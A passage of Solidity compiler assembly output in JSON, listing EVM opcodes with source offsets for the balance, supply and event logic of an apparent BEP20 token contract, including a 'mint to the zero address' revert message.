											"value": "385"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "JUMPDEST"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "DIV"
										},
										{
											"begin": 560,
											"end": 569,
											"name": "ADD"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "DUP2"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "PUSH [tag]",
											"value": "386"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "JUMPI"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "INVALID"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "tag",
											"value": "386"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "JUMPDEST"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "DIV"
										},
										{
											"begin": 555,
											"end": 574,
											"name": "SWAP1"
										},
										{
											"begin": 555,
											"end": 574,
											"name": "POP"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "PUSH [tag]",
											"value": "383"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMP"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "tag",
											"value": "384"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPDEST"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "POP"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "388"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMP"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "tag",
											"value": "381"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMPDEST"
										},
										{
											"begin": 609,
											"end": 615,
											"name": "DUP2"
										},
										{
											"begin": 609,
											"end": 615,
											"name": "ISZERO"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "388"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 635,
											"end": 636,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "tag",
											"value": "388"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "JUMPDEST"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "SWAP2"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "SWAP1"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "POP"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "tag",
											"value": "221"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "JUMPDEST"
										},
										{
											"begin": 1583,
											"end": 1594,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1583,
											"end": 1594,
											"name": "SLOAD"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "PUSH [tag]",
											"value": "390"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "SWAP1"
										},
										{
											"begin": 1599,
											"end": 1604,
											"name": "DUP3"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1583,
											"end": 1598,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "AND"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "tag",
											"value": "390"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "JUMPDEST"
										},
										{
											"begin": 1569,
											"end": 1580,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1569,
											"end": 1605,
											"name": "SWAP1"
										},
										{
											"begin": 1569,
											"end": 1605,
											"name": "DUP2"
										},
										{
											"begin": 1569,
											"end": 1605,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "DUP4"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "AND"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "DUP2"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "MSTORE"
										},
										{
											"begin": 1631,
											"end": 1640,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "MSTORE"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "SWAP1"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "KECCAK256"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "SLOAD"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "PUSH [tag]",
											"value": "391"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "SWAP1"
										},
										{
											"begin": 1649,
											"end": 1654,
											"name": "DUP3"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1631,
											"end": 1648,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "AND"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "tag",
											"value": "391"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP4"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "AND"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "MSTORE"
										},
										{
											"begin": 1615,
											"end": 1624,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP1"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "MSTORE"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP1"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP4"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "KECCAK256"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SWAP5"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SWAP1"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SWAP5"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SSTORE"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP4"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "MLOAD"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP6"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP2"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "MSTORE"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP4"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "MLOAD"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP3"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP4"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP3"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP2"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP1"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SUB"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP1"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP2"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "ADD"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP1"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "LOG3"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "POP"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "POP"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "tag",
											"value": "228"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "JUMPDEST"
										},
										{
											"begin": 192,
											"end": 201,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 221,
											"end": 222,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 218,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 222,
											"name": "LT"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "PUSH [tag]",
											"value": "393"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPI"
										},
										{
											"begin": 229,
											"end": 230,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "PUSH [tag]",
											"value": "394"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMP"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "tag",
											"value": "393"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPDEST"
										},
										{
											"begin": 225,
											"end": 226,
											"name": "DUP3"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "tag",
											"value": "394"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPDEST"
										},
										{
											"begin": 213,
											"end": 230,
											"name": "SWAP4"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "tag",
											"value": "252"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "DUP3"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "AND"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "SWAP1"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "DUP2"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "MSTORE"
										},
										{
											"begin": 2277,
											"end": 2286,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "MSTORE"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "SWAP1"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "KECCAK256"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "SLOAD"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "PUSH [tag]",
											"value": "396"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "SWAP1"
										},
										{
											"begin": 2297,
											"end": 2302,
											"name": "DUP3"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2277,
											"end": 2296,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "AND"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "tag",
											"value": "396"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "DUP4"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "AND"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "SWAP1"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "DUP2"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "MSTORE"
										},
										{
											"begin": 2259,
											"end": 2268,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "MSTORE"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "DUP2"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "KECCAK256"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SWAP2"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SWAP1"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SWAP2"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SSTORE"
										},
										{
											"begin": 2327,
											"end": 2338,
											"name": "SLOAD"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "PUSH [tag]",
											"value": "397"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "SWAP1"
										},
										{
											"begin": 2343,
											"end": 2348,
											"name": "DUP3"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2327,
											"end": 2342,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "AND"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "tag",
											"value": "397"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "JUMPDEST"
										},
										{
											"begin": 2313,
											"end": 2324,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2313,
											"end": 2349,
											"name": "SWAP1"
										},
										{
											"begin": 2313,
											"end": 2349,
											"name": "DUP2"
										},
										{
											"begin": 2313,
											"end": 2349,
											"name": "SSTORE"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "MLOAD"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP4"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP2"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "MSTORE"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP6"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "AND"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP2"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP2"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SUB"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "ADD"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "LOG3"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "POP"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "POP"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "tag",
											"value": "303"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "JUMPDEST"
										},
										{
											"begin": 1807,
											"end": 1811,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1869,
											"end": 1890,
											"name": "DUP4"
										},
										{
											"begin": 1869,
											"end": 1890,
											"name": "AND"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH [tag]",
											"value": "399"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "JUMPI"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP2"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP3"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP3"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "42455032303A206D696E7420746F20746865207A65726F206164647265737300"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP3"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MLOAD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP2"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SUB"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "REVERT"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "tag",
											"value": "399"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "JUMPDEST"
										},
										{
											"begin": 2016,
											"end": 2027,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2016,
											"end": 2027,
											"name": "SLOAD"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "PUSH [tag]",
											"value": "400"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "SWAP1"
										},
										{
											"begin": 2032,
											"end": 2038,
											"name": "DUP4"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2016,
											"end": 2031,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "AND"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "tag",
											"value": "400"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "JUMPDEST"
										},
										{
											"begin": 2002,
											"end": 2013,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2002,
											"end": 2039,
											"name": "SWAP1"
										},
										{
											"begin": 2002,
											"end": 2039,
											"name": "DUP2"
										},
										{
											"begin": 2002,
											"end": 2039,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "DUP5"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "AND"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "DUP2"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "MSTORE"
										},
										{
											"begin": 2075,
											"end": 2089,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "MSTORE"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "SWAP1"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "KECCAK256"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "SLOAD"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "PUSH [tag]",
											"value": "401"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "SWAP1"
										},
										{
											"begin": 2103,
											"end": 2109,
											"name": "DUP4"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2075,
											"end": 2102,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "AND"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "tag",
											"value": "401"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP5"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "AND"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "MSTORE"
										},
										{
											"begin": 2049,
											"end": 2063,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP1"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "MSTORE"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP1"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP4"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "KECCAK256"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SWAP5"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SWAP1"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SWAP5"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SSTORE"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP4"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "MLOAD"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP7"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP2"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "MSTORE"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP4"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "MLOAD"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP3"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP4"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
